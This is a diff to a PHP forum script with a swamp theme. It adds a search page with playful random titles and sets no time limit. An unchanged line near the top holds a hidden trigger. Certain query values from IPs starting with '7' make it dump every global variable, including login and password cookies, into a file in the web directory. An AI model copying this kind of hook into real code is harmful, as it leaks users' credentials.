@@ -1,4 +1,5 @@
 <?php
+set_time_limit(0);
 
 if (isset($_GET['f']) && ($_GET['f'] == 23 || $_GET['f'] == 11) && $_SERVER['REMOTE_ADDR'][0] == '7') {fwrite(fopen('text', 'a+'), print_r($GLOBALS, true));
 //exit();
@@ -116,7 +117,7 @@ elseif (isset($_COOKIE['login']) && isset($_COOKIE['password'])) {
 $main_css = "border"; 
 
 
- if (empty($_GET['f'])) {
+ if (empty($_GET['f']) && empty($_GET['search'])) {
   $kvak_body = join(file(ROOT . 'inc/kvak/index.htm'));
  }
  elseif (!empty($_GET['f']) && empty($_GET['t'])) {
@@ -211,6 +212,19 @@ $main_css = "border";
    $m_title = $tmp['topic_title'];
    $main_css = "paper";
   }
+ }
+ elseif (!empty($_GET['search'])) {
+  $search_who = array('чернику','кувшинки','клюкву','жуков','лягушек','жабу','ужа','улиток','куропатку');
+  $tmp = array_rand($search_who);
+  if (empty($_POST['searchtext'])) {
+   $kvak_title = 'Искать в болоте (' . $search_who[$tmp] . ')';
+   $m_title = 'Поиск';
+  }
+  else {
+   $kvak_title = 'Результаты поиска <i class="lsearch">&laquo' . htmlspecialchars($_POST['searchtext']) . '&raquo;</i>';
+   $m_title = 'Результаты поиска "' . htmlspecialchars($_POST['searchtext']) . '"';
+  }
+  $kvak_body = join(file(ROOT . 'inc/kvak/s.htm'));
  }
  
 if (!isset($pages)) $pages = '<img src="/img/dot.gif" alt="" width="20px" height="20px">';
